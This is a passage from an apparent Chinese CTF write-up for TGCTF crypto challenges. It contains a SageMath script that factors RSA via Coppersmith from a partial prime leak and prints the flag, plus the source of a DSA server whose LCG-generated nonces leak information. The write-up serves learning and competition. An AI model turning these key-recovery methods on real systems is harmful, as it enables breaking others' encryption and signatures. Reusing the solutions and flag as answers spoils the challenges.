number\">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span>\n\na<span class=\"token operator\">=</span><span class=\"token number\">4036991100</span>\n\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    f <span class=\"token operator\">=</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">288</span> <span class=\"token operator\">+</span> p0_ <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">256</span>\n    f <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    roots <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">225</span><span class=\"token punctuation\">,</span> beta<span class=\"token operator\">=</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">,</span>epsilon<span class=\"token operator\">=</span><span class=\"token number\">0.04</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> roots<span class=\"token punctuation\">:</span>\n        x <span class=\"token operator\">=</span> roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n        p_candidate <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">288</span> <span class=\"token operator\">+</span> p0_ <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> p_candidate <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found p:\"</span><span class=\"token punctuation\">,</span> p_candidate<span class=\"token punctuation\">)</span>\n            q_candidate <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> p_candidate\n            <span class=\"token keyword\">break</span>\n\n<span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> libnum <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p_candidate<span class=\"token punctuation\">)</span>\nq<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>q_candidate<span class=\"token punctuation\">)</span>\ne<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">4036989615</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>n<span class=\"token operator\">%</span>p<span class=\"token punctuation\">,</span>n<span class=\"token operator\">%</span>q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nd<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token operator\">//</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nc<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>y<span class=\"token operator\">>=</span>Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nf<span class=\"token operator\">=</span>y<span class=\"token operator\">^</span><span class=\"token number\">15</span><span class=\"token operator\">-</span>c\nf<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nm1<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>z<span class=\"token operator\">>=</span>Zmod<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nf<span class=\"token operator\">=</span>z<span class=\"token operator\">^</span><span class=\"token number\">15</span><span class=\"token operator\">-</span>c\nf<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nm2<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m1<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> m2<span class=\"token punctuation\">:</span>\n        m<span class=\"token operator\">=</span>solve_crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">b'TGCTF'</span> <span class=\"token keyword\">in</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>记得解码flag,不然就会出现解出flag了但是全是字节码导致我以为哪里错了</p>\n<blockquote>\n<p>TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢</p>\n</blockquote>\n<h3 id=\"LLLCG\"><a href=\"#LLLCG\" class=\"headerlink\" title=\"LLLCG\"></a><strong><strong>LLLCG</strong></strong></h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha256\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint\n<span class=\"token keyword\">import</span> socketserver\n<span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> dsa_p<span class=\"token punctuation\">,</span> dsa_q\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">TripleLCG</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">]</span>\n        self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> a\n        self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> b\n        self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> c\n        self<span class=\"token punctuation\">.</span>d <span class=\"token operator\">=</span> d\n        self<span class=\"token punctuation\">.</span>n <span class=\"token operator\">=</span> n\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        new <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>n\n        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>new<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> new\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">DSA</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># while True:</span>\n            <span class=\"token comment\"># self.q = getPrime(160)</span>\n            <span class=\"token comment\"># t = 2 * getPrime(1024 - 160) * self.q</span>\n            <span class=\"token comment\"># if isPrime(t + 1):</span>\n            <span class=\"token comment\">#    self.p = t + 1</span>\n            <span class=\"token comment\">#    break</span>\n        self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">=</span> dsa_p\n        self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">=</span> dsa_q\n        self<span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">sign</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>inverse<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">*</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">verify</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> r <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q <span class=\"token keyword\">and</span> <span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> s <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        w <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span>\n        u1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        u2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        v <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> u1<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> u2<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> v <span class=\"token operator\">==</span> r\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Task</span><span class=\"token punctuation\">(</span>socketserver<span class=\"token punctuation\">.</span>BaseRequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">_recvall</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        BUFF_SIZE <span class=\"token operator\">=</span> <span class=\"token number\">2048</span>\n        data <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n            part <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>BUFF_SIZE<span class=\"token punctuation\">)</span>\n            data <span class=\"token operator\">+=</span> part\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>part<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> BUFF_SIZE<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">return</span> data<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> newline<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> newline<span class=\"token punctuation\">:</span>\n            msg <span class=\"token operator\">+=</span> <span class=\"token string\">b'\\n'</span>\n        self<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> prompt<span class=\"token operator\">=</span><span class=\"token string\">b'[-] '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>prompt<span class=\"token punctuation\">,</span> newline<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>_recvall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        n <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span>\n        a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n        seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n        lcg <span class=\"token operator\">=</span> TripleLCG<span class=\"token punctuation\">(</span>seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n        dsa <span class=\"token operator\">=</span> DSA<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n        self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Welcome to TGCTF Challenge!\\n\"</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"p = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, q = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, g = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, y = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n        small_primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">59093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43759</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52859</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60457</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61469</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43711</span><span class=\"token punctuation\">]</span>\n        used_messages <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> o_v <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Select challenge parts: 1, 2, 3\\n\"</span><span class=\"token punctuation\">)</span>\n            parts <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'1'</span> <span class=\"token keyword\">in</span> parts<span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Part 1\\n\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Message </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: \"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    msg <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    used_messages<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span>\n                    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    r<span class=\"token punctuation\">,</span> s <span class=\"token operator\">=</span> dsa<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"r = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>r<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, ks = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">[</span>k <span class=\"token operator\">%</span> p <span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> small_primes<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'2'</span> <span class=\"token keyword\">in</span> parts<span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Part 2\\n\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">307</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token 